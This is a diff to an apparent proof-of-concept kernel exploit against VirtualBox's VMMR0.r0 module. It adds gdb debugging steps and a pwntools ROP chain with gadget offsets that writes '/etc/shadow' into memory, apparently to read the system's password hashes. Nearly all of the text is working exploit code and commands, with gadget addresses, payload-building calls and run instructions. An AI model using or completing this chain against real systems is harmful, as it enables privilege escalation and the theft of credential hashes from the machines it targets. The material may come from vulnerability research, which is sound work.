@@ -6,6 +6,19 @@ context.clear(arch='amd64', kernel='amd64')
 gcc -g -D OF_SIZE=128 userspace.c -o userspace
 python3 ./poc.py VMMR0.r0 payload 100
 
+gdb -tui userspace
+b userspace.c:90
+r VMMR0.r0 payload
+
+Now in other window
+./poc.py VMMR0.r0 payload 30 0x7ffff78da000
+Then ctrl-d in gdb so userspace will continue
+
+s
+si
+x/64x $rsp
+si
+
 VMMR0:  http://www.ropshell.com/ropsearch?h=f81f7bdd9ffe47e093805c9d2f626f38
 pop rdi; ret;                       VMMR0 + 0x07b62a
 pop rax; ret;                       VMMR0 + 0x01f7bd
@@ -23,6 +36,7 @@ mov [rdi], rax
 WHICH IN x64 IS
 0:  48 89 07                mov    QWORD PTR [rdi],rax
 
+mov    %rax,(%rdi)                  VMMR0 + 0x081643
 
 
 syscall; ret;                       VMMR0 + 0x012c3c0
@@ -76,38 +90,35 @@ def build(leak, gadget_file, sled_length):
     # pop rax; ret;
     rop.raw(adjuster(leak + 0x01f7bd))
     # /etc
-    # rop.raw(b'cte/')
-    rop.raw(b'AAAA')
+    rop.raw(b'/etc')
     # pop rdi; ret;
     rop.raw(adjuster(leak + 0x07b62a))
     # set rdi
-    rop.raw(adjuster(string_location - 0x02a50))
-    # mov rax, [rdi + 0x2a50]; ret;
-    rop.raw(adjuster(leak + 0x0b7470))
+    rop.raw(adjuster(string_location))
+    # mov rax, (rdi)
+    rop.raw(adjuster(leak + 0x081643))
 
     # pop rax; ret;
     rop.raw(adjuster(leak + 0x01f7bd))
     # /sha
-    # rop.raw(b'ahs/')
-    rop.raw(b'AAAA')
+    rop.raw(b'/sha')
     # pop rdi; ret;
     rop.raw(adjuster(leak + 0x07b62a))
     # set rdi
-    rop.raw(adjuster(string_location - 0x02a50 + 4))
-    # mov rax, [rdi + 0x2a50]; ret;
-    rop.raw(adjuster(leak + 0x0b7470))
+    rop.raw(adjuster(string_location + 4))
+    # mov rax, (rdi)
+    rop.raw(adjuster(leak + 0x081643))
 
     # pop rax; ret;
     rop.raw(adjuster(leak + 0x01f7bd))
     # dow\x00
-    # rop.raw(b'\x00wod')
-    rop.raw(b'\x00AAA')
+    rop.raw(b'dow\x00')
     # pop rdi; ret;
     rop.raw(adjuster(leak + 0x07b62a))
     # set rdi
-    rop.raw(adjuster(string_location - 0x02a50 + 8))
-    # mov rax, [rdi + 0x2a50]; ret;
-    rop.raw(adjuster(leak + 0x0b7470))
+    rop.raw(adjuster(string_location + 8))
+    # mov rax, (rdi)
+    rop.raw(adjuster(leak + 0x081643))
 
     # Display our completed ROP chain
     print(rop.dump())
